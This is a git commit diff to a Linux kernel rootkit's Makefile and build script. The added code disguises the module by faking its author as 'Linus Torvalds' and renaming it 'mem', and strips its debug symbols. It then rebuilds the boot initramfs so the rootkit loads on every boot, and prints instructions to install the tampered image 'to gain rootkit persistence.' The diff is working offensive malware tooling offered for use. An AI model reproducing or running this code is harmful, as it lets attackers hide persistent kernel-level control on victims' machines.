49ffb94b92df6b9a83c93bdc29cc7e9da6a5e6d6
Tommy <43862943+tommyp6@users.noreply.github.com>
2021-05-25 19:16:11 +0200

    Finish TODO tasks.

--- Makefile
+++ Makefile
@@ -3,7 +3,11 @@ obj-m += rootkit.o
 all:
 		make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
 clean:
+		rm -rf build
 		make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 
 dev: all
 	@bash install.sh
+
+prod:
+	@bash prod.sh
--- prod.sh
+++ prod.sh
@@ -1,6 +1,6 @@
 #!/bin/env bash
 
-outdir="build/"
+outdir="build"
 password_len=12
 password="$(openssl rand -hex $password_len)"
 device_name="mem"
@@ -16,13 +16,20 @@ sed -i "s/MODULE_AUTHOR(\".*\")/MODULE_AUTHOR(\"Linus Torvalds\")/g" "$outdir/ro
 sed -i "s/RK_PASSWORD \".*\"/RK_PASSWORD \"$password\"/g" "$outdir/rootkit.c"
 sed -i "s/RK_PASSWORD_LEN .*/RK_PASSWORD_LEN $(($password_len * 2))/g" "$outdir/rootkit.c"
 sed -i "s/RK_DEVICE_NAME \".*\"/RK_DEVICE_NAME \"$device_name\"/g" "$outdir/rootkit.c"
+mv "$outdir/rootkit.c" "$outdir/tmp_rootkit.c"
+unifdef -UDEBUG "$outdir/tmp_rootkit.c" > "$outdir/rootkit.c"
+rm "$outdir/tmp_rootkit.c"
 
 mv "$outdir/rootkit.c" "$outdir/$device_name.c"
 sed -i "s/obj-m += rootkit.o/obj-m += $device_name.o/g" "$outdir/Makefile"
-unifdef -UDEBUG "$outdir/$device_name.c" | tee "$outdir/$device_name.c"
 cd "$outdir" && make && cd -
 strip --strip-debug "$outdir/$device_name.ko"
 
-echo "password: $password" > "$outdir/config.txt"
+mkdir "$outdir/initramfs" && cd "$outdir/initramfs" && lsinitcpio -x /boot/initramfs-linux.img && cd -
+cp "$outdir/$device_name.ko" "$outdir/initramfs"
+sed -i "s/rdlogger_stop/rdlogger_stop\ninsmod \/$device_name.ko/g" "$outdir/initramfs/init"
+cd "$outdir/initramfs" && find -mindepth 1 -printf '%P\0' | LANG=C bsdcpio -0 -o -H newc --quiet | gzip > ../initramfs-linux.img && cd -
 
+echo "password: $password" > "$outdir/config.txt"
 echo "Your rootkit password is: $password"
+echo "You can now copy build/initramfs-linux.img to /boot/initramfs-linux.img to gain rootkit persistence."
